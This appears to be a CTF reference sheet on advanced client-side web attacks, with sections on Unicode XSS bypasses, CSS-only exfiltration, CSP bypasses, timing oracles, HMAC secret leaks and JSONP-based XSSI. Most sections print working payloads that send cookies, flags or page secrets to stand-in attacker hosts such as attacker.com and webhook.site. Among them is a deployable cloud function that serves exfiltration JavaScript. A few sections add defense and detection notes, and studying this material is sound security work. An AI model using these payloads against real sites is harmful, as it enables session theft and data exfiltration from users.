# CTF Web - Advanced Client-Side Attacks

Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles, HMAC bypass, CSP bypasses, and XSSI techniques.

## Table of Contents
- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
- [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
- [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
- [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
- [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
- [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)

---

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**Pattern (demolition):** Server-side sanitizer (Flask regex `<\s*/?\s*script`) only matches ASCII. A second processing layer (Go `strings.EqualFold`) applies Unicode case folding, which canonicalizes `ſ` (U+017F, Latin Long S) to `s`.

**Payload:**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**How it works:**
1. Flask regex checks for `<script` -- `<ſcript` does not match (ſ ≠ s in ASCII regex)
2. Go's `strings.EqualFold` canonicalizes `ſ` to `s`, treating `<ſcript>` as `<script>`
3. Frontend inserts via `innerHTML` -- browser parses the now-valid script tag

**Other Unicode folding pairs for bypass:**
- `ſ` (U+017F) -> `s` / `S`
- `ı` (U+0131) -> `i` / `I`
- `ﬁ` (U+FB01) -> `fi`
- `K` (U+212A, Kelvin sign) -> `k` / `K`

**Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.

---

## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)

**Pattern (larpin):** Exfiltrate inline script content (e.g., `window.__USER_CONFIG__`) via CSS injection without JavaScript execution. Uses custom font glyph widths and CSS container queries as an oracle.

**Technique:**
1. **Target selection** -- CSS selector targets inline script: `script:not([src]):has(+script[src*='purify'])`
2. **Custom font** -- Each character glyph has a unique advance width: `width = (char_index + 1) * 1536` font units
3. **Container query oracle** -- Wrapping element uses `container-type: inline-size`. Container queries match specific width ranges to trigger background-image requests:
```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```
4. **Per-character probing** -- Iterate positions, each probe narrows to one character based on measured width

**Key insight:** CSS container queries (no JavaScript needed) combined with custom font metrics create a pixel-perfect oracle for text content. Works even under strict CSP that blocks all scripts.

---

## Hyperscript CDN CSP Bypass (UNbreakable 2026)

**Pattern (minegamble):** CSP allows `cdnjs.cloudflare.com` scripts. Hyperscript (`_hyperscript`) processes `_=` attributes client-side after HTML sanitization, enabling post-sanitization code execution.

**Payload:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

**How it works:**
1. HTML passes sanitizer (no inline script, no event handlers)
2. Hyperscript library loads from CDN (allowed by CSP)
3. Hyperscript scans DOM for `_=` attributes and executes them as behavioral directives
4. `on load` triggers arbitrary actions including fetch, DOM manipulation, cookie access

**Key insight:** Hyperscript, Alpine.js (`x-data`, `x-init`), htmx (`hx-get`, `hx-trigger`), and similar declarative JS frameworks execute code from HTML attributes that sanitizers don't recognize. If any CDN-hosted behavioral framework is CSP-allowed, it bypasses both CSP and HTML sanitizers.

---

## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)

**Pattern (svfgp):** Server checks `secret.startsWith(candidate)` where verification involves expensive PBKDF2 (3M iterations). Mismatches return fast; matches run the full KDF, creating a measurable timing difference.

**Exfiltration via postMessage:**
1. Open target page in a popup
2. For each character position, probe all candidates (`a-z0-9_}`)
3. Measure round-trip time via `postMessage` / response timing
4. Highest-latency character = correct prefix match

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    // Navigate popup to verification endpoint with candidate prefix
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();  // postMessage or load event
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.

---

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

**Pattern:** Application builds request URLs client-side with an HMAC parameter. The secret key is hardcoded in obfuscated JavaScript.

**Attack steps:**
1. Deobfuscate client-side JS (jsbeautifier.org or browser DevTools pretty-print)
2. Locate the signing function and extract the hardcoded secret
3. Use the leaked function directly in browser console to forge valid signatures for arbitrary requests

```javascript
// Discovered in deobfuscated main.js:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
    return "/load?p=" + page + "&s=" + sig;
}

// Exploit: call the leaked global function in browser console
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
// Fetching index.php via the p parameter returns raw PHP source code
```

**Key insight:** Client-side HMAC/signature schemes leak the secret by definition -- the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.

---

## Terminal Control Character Obfuscation (SECCON 2015)

Server responses may hide data using ASCII backspace (0x08) characters. The terminal renders `S\x08 ` as a space (overwrites 'S'), making the flag invisible in normal display. Extract by reading raw bytes:

```python
import socket
s = socket.socket()
s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
# Or: filter only printable chars that aren't followed by backspace
```

---

## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)

When Content-Security-Policy whitelists cloud platform domains (e.g., `*.us-central1.run.app`, `*.cloudfunctions.net`, `*.azurewebsites.net`):

1. Deploy a malicious script to the whitelisted cloud platform
2. Load it via `<script src="https://your-func-xxxxx.us-central1.run.app">` -- passes CSP
3. Exfiltrate data from the vulnerable page

```python
# Google Cloud Function that serves exfiltration JS
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                       'Access-Control-Allow-Origin': '*'})
```

Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`.

**Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.

---

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**Pattern (web-tutorial-2):** CSP uses `script-src 'nonce-xxx'` to restrict script execution to nonced scripts. However, the CSP is missing the `base-uri` directive. If you can inject HTML before a nonced script that loads from a relative URL, inject a `<base>` tag to redirect the relative URL to your server.

**Vulnerable CSP:**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
Notice: no `base-uri` directive.

**Vulnerable page HTML:**
```html
<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
<base href="https://attacker.com/">
<!-- ... later in the page ... -->
<script nonce="abc123" src="test.js"></script>
```

**How it works:**
1. The `<base href="https://attacker.com/">` tag changes the base URL for all relative URLs on the page
2. When the browser encounters `<script nonce="abc123" src="test.js">`, it resolves `test.js` relative to the new base -> `https://attacker.com/test.js`
3. The script has a valid nonce, so CSP allows it
4. The script loads from the attacker's server, executing arbitrary JavaScript

**Exploit setup:**
```python
# Host malicious test.js on attacker server
# test.js content:
"""
fetch('/api/flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
"""
```

**Injection payload:**
```html
<base href="https://attacker.com/">
```

**Key insight:** The `<base>` tag affects ALL relative URLs on the page, including nonced scripts. CSP `script-src 'nonce-xxx'` only validates that the nonce matches -- it does NOT restrict where the script is loaded from (that would require `script-src` with domain restrictions). Without `base-uri 'self'` or `base-uri 'none'` in the CSP, any HTML injection point before a relative-URL nonced script enables full CSP bypass.

**Defense:** Always include `base-uri 'self'` or `base-uri 'none'` in CSP policies that use nonces. This prevents `<base>` tag injection from redirecting script sources.

**Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.

**References:** BSidesSF 2026 "web-tutorial-2"

---

## XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)

**Pattern (three-questions-3):** Multi-stage attack chain:
1. **Cookie hash inversion:** User ID cookie is `SHA1(numeric_id)` where ID is a small integer (1-100000). Brute-force the hash to recover the numeric ID.
2. **IDOR on debug endpoint:** `/debug/game-state?user_id=<numeric_id>` returns game state (discovered via HTML comments + robots.txt).
3. **XSSI exfiltration:** The admin's game state is exfiltrated via Cross-Site Script Inclusion. A JSONP-like endpoint (`/characters.js?callback=leak`) wraps response data in a function call. Inject a `<script src>` tag via an admin message feature that loads this endpoint with a custom callback, which forwards the data to an attacker-controlled cloud function.

```html
<!-- Injected via /admin-message endpoint -->
<script>
function leak(data) {
    // Exfiltrate to attacker's cloud function
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

```python
# Step 1: Brute-force SHA1 cookie to recover numeric user ID
import hashlib

cookie_hash = "a1b2c3d4..."  # From document.cookie
for i in range(1, 100001):
    if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
        print(f"User ID: {i}")
        break

# Step 2: Access debug endpoint
# GET /debug/game-state?user_id={recovered_id}
```

**Key insight:** XSSI (Cross-Site Script Inclusion) exploits endpoints that return JavaScript (JSONP callbacks, JS variable assignments) containing sensitive data. Unlike XSS, XSSI doesn't require injecting script into the target page -- it loads the target's script cross-origin. The `callback` parameter in JSONP endpoints is the classic vector. Combined with an admin bot that visits attacker-controlled pages, this enables server-side data exfiltration.

**When to recognize:** Application has JSONP endpoints or serves JavaScript files with dynamic data. CSP may allow `script-src` from same origin. Look for `?callback=` or `?jsonp=` parameters. The attack chain typically combines: weak cookie hashing -> IDOR -> XSSI -> OOB exfiltration.

**Defense:** Disable JSONP/callback parameters. Return `Content-Type: application/json` (not `application/javascript`). Add `X-Content-Type-Options: nosniff`. Use CORS properly instead of JSONP.

---

## CSP Bypass via link prefetch (Boston Key Party 2016)

`<link rel="prefetch">` is not blocked by CSP `script-src` directives, enabling scriptless data exfiltration:

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

**Key insight:** CSP restricts script execution but not navigation or resource prefetch. Use `<link rel="prefetch">` or `<meta http-equiv="refresh">` for scriptless exfiltration when XSS is possible but `script-src` blocks inline/remote JS. Data is sent via URL parameters or the `Referer` header.
